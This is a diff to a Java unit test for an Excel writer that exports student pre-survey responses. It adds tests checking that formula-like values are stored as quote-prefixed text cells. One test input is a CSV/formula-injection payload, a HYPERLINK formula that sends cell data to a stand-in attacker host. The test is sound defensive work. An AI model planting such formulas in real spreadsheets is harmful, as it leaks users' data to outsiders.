@@ -7,6 +7,7 @@ import java.io.IOException;
 import java.util.List;
 
 import org.apache.poi.ss.SpreadsheetVersion;
+import org.apache.poi.ss.usermodel.CellType;
 import org.apache.poi.ss.usermodel.Row;
 import org.apache.poi.ss.usermodel.Workbook;
 import org.apache.poi.xssf.usermodel.XSSFWorkbook;
@@ -27,6 +28,7 @@ class PreSurveyResponseExcelWriterTest {
     private static final int MAX_CELL_LENGTH = SpreadsheetVersion.EXCEL2007.getMaxTextLength();  // 32,767
     private static final String TRUNCATED_MARK = "…(이하 생략)";
     private static final Long SECTION_ID = 1L;
+    private static final int NAME = 1;
     private static final int ROLES = 2;
     private static final int TOPIC_OPINION = 3;
     private static final int ETC_OPINION = 4;
@@ -70,16 +72,49 @@ class PreSurveyResponseExcelWriterTest {
         assertThat(cells.get(ROLES)).hasSize(MAX_CELL_LENGTH).endsWith(TRUNCATED_MARK);
     }
 
+    @Test
+    @DisplayName("수식으로 읽힐 수 있는 문자로 시작하는 값은 텍스트 셀로 고정한다")
+    void write_QuotePrefixesFormulaLikeValues() throws Exception {
+        String attack = "=HYPERLINK(\"http://attacker.example/steal?data=\"&A1,\"클릭\")";
+
+        try (Workbook workbook = workbook(new PreSurveyResponseRow("202412345", "@이석민",
+            PreSurveyResponse.create("202412345", SECTION_ID,
+                objectMapper.createArrayNode().add("+BACKEND"), attack, "-금요일 회의 어려움")))) {
+            Row row = workbook.getSheetAt(0).getRow(1);
+
+            for (int column : List.of(NAME, ROLES, TOPIC_OPINION, ETC_OPINION)) {
+                assertThat(row.getCell(column).getCellType()).isEqualTo(CellType.STRING);
+                assertThat(row.getCell(column).getCellStyle().getQuotePrefixed()).isTrue();
+            }
+            // 값 자체는 손대지 않아 교수가 원문을 그대로 읽을 수 있다
+            assertThat(row.getCell(TOPIC_OPINION).getStringCellValue()).isEqualTo(attack);
+        }
+    }
+
+    @Test
+    @DisplayName("평범한 값에는 인용 접두를 붙이지 않는다")
+    void write_KeepsPlainValuesUnquoted() throws Exception {
+        try (Workbook workbook = workbook(row("학사 알림 서비스", "금요일 회의 어려움"))) {
+            Row row = workbook.getSheetAt(0).getRow(1);
+
+            assertThat(row.getCell(TOPIC_OPINION).getCellStyle().getQuotePrefixed()).isFalse();
+            assertThat(row.getCell(ETC_OPINION).getCellStyle().getQuotePrefixed()).isFalse();
+        }
+    }
+
     private PreSurveyResponseRow row(String topicOpinion, String etcOpinion) throws IOException {
         return new PreSurveyResponseRow("202412345", "이석민",
             PreSurveyResponse.create("202412345", SECTION_ID, objectMapper.readTree("[\"BACKEND\"]"),
                 topicOpinion, etcOpinion));
     }
 
+    private Workbook workbook(PreSurveyResponseRow source) throws IOException {
+        return new XSSFWorkbook(new ByteArrayInputStream(PreSurveyResponseExcelWriter.write(List.of(source))));
+    }
+
     // 통합문서를 만들어 첫 데이터 행의 셀 문자열을 읽는다.
     private List<String> write(PreSurveyResponseRow source) throws IOException {
-        byte[] content = PreSurveyResponseExcelWriter.write(List.of(source));
-        try (Workbook workbook = new XSSFWorkbook(new ByteArrayInputStream(content))) {
+        try (Workbook workbook = workbook(source)) {
             Row row = workbook.getSheetAt(0).getRow(1);
             return List.of(
                 row.getCell(0).getStringCellValue(),
